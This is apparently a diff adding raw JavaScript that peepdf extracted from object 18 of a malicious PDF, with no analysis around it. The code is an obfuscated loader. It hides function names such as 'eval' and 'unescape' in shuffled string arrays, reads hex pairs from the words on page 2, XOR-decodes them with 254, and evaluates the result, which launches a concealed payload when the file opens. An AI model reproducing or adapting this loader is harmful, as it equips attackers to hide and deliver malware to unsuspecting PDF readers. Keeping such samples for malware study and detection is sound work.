@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 18 (version 0)
+
+				var googleGoogle = this;
+				var unlock = ["a", "e", "v", "", "l"];
+				mail = new String(unlock[1] + unlock[2] + unlock[0] + unlock[4] + unlock[3]);
+				var send = ["", "getPa", "geNth", "Word"];
+				google = new String(send[1] + send[2] + send[3] + send[0]);
+				var b = ["rds", "mWo", "get", "Pag", "eNu", ""];
+				unlockEdit = new String(b[2] + b[3] + b[4] + b[1] + b[0] + b[5]);
+				var bEdit = ["p", "s", "n", "e", "", "a", "c", "u", "e"];
+				a = new String(bEdit[7] + bEdit[2] + bEdit[3] + bEdit[1] + bEdit[6] + bEdit[5] + bEdit[0] + bEdit[3] + bEdit[4]);
+				var aMail = ["", "t", "rCo", "deA", "cha"];
+				mailD = new String(aMail[4] + aMail[2] + aMail[3] + aMail[1] + aMail[0]);
+				var googleA = ["fromC", "", "de", "harCo"];
+				mailSend = new String(googleA[0] + googleA[3] + googleA[2] + googleA[1]);
+				var d = ["", "p", "p", "a"];
+				googleD = new String(d[3] + d[1] + d[1] + d[0]);
+				var cEdit = "am8%".substr(3);
+				var c = 2;
+				var bEditC = String;
+				var bB = 0;
+				var aB = 254;
+				var googleD = googleGoogle[googleD];
+				var get = 2;
+				var googleASend = googleGoogle[a];
+				var aBB = googleGoogle[unlockEdit](get);
+				var edit = "";
+				for (var mailGoogle = bB; mailGoogle < aBB; mailGoogle += 1) {
+				    mailEdit = googleGoogle[google](get, mailGoogle);
+				    var googleDD = mailEdit.substr(mailEdit.length - c, c);
+				    var getA = googleASend(cEdit + googleDD);
+				    var unlockGet = getA[mailD](bB);
+				    var bGet = unlockGet ^ aB;
+				    edit += bEditC[mailSend](bGet);
+				}
+				this[mail](edit);
+
